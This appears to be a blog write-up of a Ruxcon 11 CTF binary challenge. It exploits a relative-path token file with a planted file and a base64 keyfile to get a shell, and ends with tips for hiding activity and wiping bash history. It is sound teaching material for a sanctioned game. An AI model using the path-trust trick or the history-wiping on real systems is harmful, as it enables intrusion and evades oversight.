---
layout: post
title: "Ruxcon 11 [Pwnable 2] Write Up"
categories: ctf
tags:
    - ctf
    - writeup
    - pwnable
    - ida
    - re
---
This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. `file` and `cat` quickly revealed that `level2` is an x86–64 ELF executable that hasn’t been stripped. `tokenfile` is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file!

```bash
➜ pwnable2 file level2
level2: ELF 64-bit LSB executable, x86–64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86–64.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped
```

When we run `level2` it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”.
Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names:

```bash
➜ pwnable2 strings level2
<snip>

parse_header
no_keys

<snip>

auth_scheme
sizetype
key_for_scheme
token_from_file
XorDecode
try_authenticate

<snip>

mod_table
encoding_table
base64_encode
base64_decode
build_decoding_table
base64_cleanup
input_length
output_length
encoded_data

<snip>
```

Looks like there’s authentication attempts, parsing, base64, decoding, etc.
We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password.

```bash
➜ pwnable2 ./level2 — beans
Usage: ./level2 <keyfile> or — for stdin

➜ pwnable2 ./level2 -
password
Invalid Scheme specified.
```

FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls.

```bash
➜ pwnable2 ltrace ./level2 -
__libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 <unfinished …>
strcmp(“-”, “-”) = 0
malloc(1032) = 0x16bd010
__isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password
) = 0
malloc(0) = 0x16bd420
malloc(4104) = 0x16bd440
strcmp(“”, “XOR”) = -88
strcmp(“”, “NOENCRYPT”) = -78
fprintf(0x7f4c18f5c060, “Invalid Scheme specified.\n”Invalid Scheme specified.
) = 26
+++ exited (status 1) +++
```

Notice the calls to `strcmp("", "XOR")` and `strcmp("", "NOENCRYPT")`, followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on.

Note that I’m using the superduper awesome Python Exploit Development Assistant 'peda.py' for GDB, it makes GDB not suck in the way that [milk makes cereal not suck](https://theoatmeal.com/pl/minor_differences/cereal).  
Here, we run gdb `level2`, set a breakpoint for the `__isoc99_fscanf` function and set up the program arguments to accept input from stdin.

![Breaking on __isoc99_fscanf in GDB](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-1.png)

Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming `i r`!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string.

```text
SCANF(3) Linux Programmer’s Manual SCANF(3)

NAME
scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion
SYNOPSIS
#include <stdio.h>
int scanf(const char *format, …);
int fscanf(FILE *stream, const char *format, …);

<snip>

The conversion specifications in format are of two forms, either beginning with ‘%’
or beginning with “%n$”. The two forms should not be mixed in the same format
string, except that a string containing “%n$” specifications can include %% and %*.
If format contains ‘%’ specifications, then these correspond in order with
successive pointer arguments. In the “%n$” form (which is specified in
POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted
input should be placed in the location referred to by the n-th pointer argument
following format.

Conversions
l Indicates either that the conversion will be one of d, i, o, u,
x, X, or n and the next pointer is a pointer to a long int or unsigned long
int (rather than int), or that the conversion will be one of e, f, or g
and the next pointer is a pointer to double (rather than float). Specifying
two l characters is equivalent to L. If used with %c or %s, the
corresponding parameter is considered as a pointer to a wide character or
wide-character string respectively.
u Matches an unsigned decimal integer; the next pointer must be a pointer
to unsigned int.
s Matches a sequence of non-white-space characters; the next pointer
must be a pointer to character array that is long enough to hold the input
sequence and the terminating null byte (‘\0’), which is added
automatically. The input string stops at white space or at the maximum
field width, whichever occurs first.

<snip>
```
The fscanf format string, `"%lu:%1023s"`, can be broken down into the following:

* `%lu` — unsigned long
* `:` — ASCII character ":"
* `%1023s` — 1023 character string (1024 with the null terminator).

Before, we just passed in the string "password" and our input didn’t make it to the `strcmp` instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin.

```bash
➜ pwnable2 echo “123:password” > key1
```

Changing the format seems to have worked! We now see the string "password" being compared against "XOR" and "NOENCRYPT", but we still hit the "Invalid Scheme specified" message. If we change our input to "123:NOENCRYPT" we see the following: `strcmp("NOENCRYPT", "NOENCRYPT")`, looks good!

```bash
➜ pwnable2 ltrace ./level2 ./key1
__libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 <unfinished …>
strcmp(“./key1”, “-”) = 1
fopen(“./key1”, “r”) = 0x2072010
malloc(1032) = 0x2072250
__isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258) = 2
malloc(629760) = 0x7f2d3cf19010
malloc(4104) = 0x2072660
strcmp(“password”, “XOR”) = 24
strcmp(“password”, “NOENCRYPT”) = 34
fprintf(0x7f2d3cdba060, “Invalid Scheme specified.\n”Invalid Scheme specified.
) = 26
+++ exited (status 1) +++

➜ pwnable2 echo “123:NOENCRYPT” > key2

➜ pwnable2 ltrace ./level2 ./key2
__libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 <unfinished …>
strcmp(“./key2”, “-”) = 1
fopen(“./key2”, “r”) = 0xc43010
malloc(1032) = 0xc43250
__isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258) = 2
malloc(629760) = 0x7efc1ddcd010
malloc(4104) = 0xc43660
strcmp(“NOENCRYPT”, “XOR”) = -10
strcmp(“NOENCRYPT”, “NOENCRYPT”) = 0
strcpy(0xc43668, “No Encryption”) = 0xc43668
__isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff
fprintf(0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0
) = 54
+++ exited (status 1) +++
```

Now we’re getting the message: "Incorrect number of entries. Expected 123 but found 0". Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let's try adding stuff to the keyfile. Adding the line “password” changes the message to "Incorrect number of entries. Expected 123 but found 1", looks like the number we pass in is a counter for the number of lines in the keyfile.

```bash
➜ pwnable2 echo “0:NOENCRYPT\npassword” > key3

➜ pwnable2 ./level2 ./key3
Incorrect number of entries. Expected 123 but found 1

➜ pwnable2 echo “1:NOENCRYPT\npassword” > key3

➜ pwnable2 ./level2 ./key3
```

Awesome! Sort of ... nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing.

Once the binary is loaded and disassembled, jump into the strings window (`SHIFT+F12`). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: "Congratulations. You’re authenticated!" Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance.

![IDA Strings](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-2.png)

So if we authenticate correctly, we get a shell. It sure looks like we're in the right place. But we can’t read the token file! If we can't read the token file it’s going to be real difficult to construct a valid keyfile.

![We want to get to here](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-3.png)

If we drill down into the `token_from_file` function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this!

![Relative path to tokenfile](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-4.png)

I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they *did* allow us to move the binary. Because the tokenfile is being opened from `./tokenfile`, if we move the binary to somewhere like `/tmp` and create our own token file, we should be able to authenticate successfully. Let’s test that theory!

```bash
➜ /tmp echo -n “1:NOENCRYPT\nwinning” > key5

➜ /tmp echo -n “winning” > tokenfile

➜ /tmp ./level2 ./key5
Key entry too large.
```

Looks like we’ve missed something. Let’s find the message "Key entry too large" in IDA.

![base64_decode call](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-5.png)

If the comparison fails and the branch isn’t taken the program prints "Key entry too large" and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the `try_authenticate` function. If we break in GDB at the point where `base64_decode` is called we see a pointer (0x602660) to our keyfile entry, "winning", being passed as an argument.

!["winning"](/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-6.png)

Decoding "winning" as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: `authenticate_with_keyfile_b64dec.c`. Sounds good, let’s try it.

```bash
➜ /tmp echo “1:NOENCRYPT” > key6

➜ /tmp echo -n “winning” | base64 >> key6

➜ /tmp ./level2 ./key6
#

# cd /home/level2

# ls
level2 tokenfile

# cat tokenfile
RUX{not_the_actual_flag_but_you_still_win}

# exit
Congratulations. You’re authenticated

➜ /tmp
```

BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I'm afraid I don't remember the actual flag).
We didn’t explore the XOR function but evidentially we didn't need it to solve the challenge. Perhaps as the subject of a follow-up post.

As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you're doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I'd recommend creating a hidden folder, working from there, then deleting the bash history.

```bash
➜ pwnable2 mkdir /.fd788743c5e54c528a6088c650cf8a9d

➜ pwnable2 cp level2 /.fd788743c5e54c528a6088c650cf8a9d

<pwn all the things>

➜ pwnable2 history -c

➜ pwnable2 cat /dev/null > ~/.bash_history
```

You know ... just to be sure.

Happy hunting.
